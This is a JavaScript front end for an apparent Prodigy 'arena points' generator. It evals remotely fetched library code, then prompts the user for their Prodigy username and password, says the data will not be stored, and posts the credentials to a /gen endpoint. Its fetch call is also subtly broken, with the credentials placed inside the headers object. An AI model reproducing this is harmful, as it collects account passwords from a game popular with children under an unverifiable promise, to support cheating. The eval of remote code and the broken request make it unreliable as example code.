window.submit = async () => {
eval(await (await fetch('https://unpkg.com/sweetalert2')).text())
Swal.mixin({
    allowOutsideClick: false,
      input: 'text',
      confirmButtonText: 'Next &rarr;',
      showCancelButton: true,
      progressSteps: ['1', '2']
    }).queue([
      {
        title: 'What is your Prodigy username?',
        text: 'Your data will not be stored on this site.'
      },
      'What is your password?',
    ]).then(t => {
    if(t.dismiss) return;
    if(!t.value[0] || !t.value[1]){
        Swal.fire("You didn't put info in all of the boxes.",'','error') 
    } else {
    Swal.fire({
      title: 'Are you sure you want to submit?',
      icon: 'warning',
      showCancelButton: true,
      confirmButtonColor: '#3085d6',
      cancelButtonColor: '#d33',
      confirmButtonText: 'Submit'
    }).then((result) => {
      if (result.isConfirmed) {
        (async () => {
          let datalink = await (await fetch(`/gen`,{
              method: "POST",
              headers: {
               'Content-Type': 'text/plain',
               body: JSON.stringify(t.value)
              }
   
          })).text()
         try{ window.data = JSON.parse(datalink)}catch{
          Swal.fire(
            'An error occured.',
            'Please try again later, or join our Discord for support.',
            'error'
          ).then(() => {
           Swal.close()
          })
         }
          if(data.code != 200){
            Swal.fire(
              'An error occured.',
              'Please try again later, or join our Discord for support.',
              'error'
            ).then(() => {
             Swal.close()
            })
          }else{
            Swal.fire(
              'Success!',
              'Arena points should be generating momentarily.',
              'success'
            ).then(() => {
             Swal.close()
            })
          }
        })()
      }
    })
  }
    })
}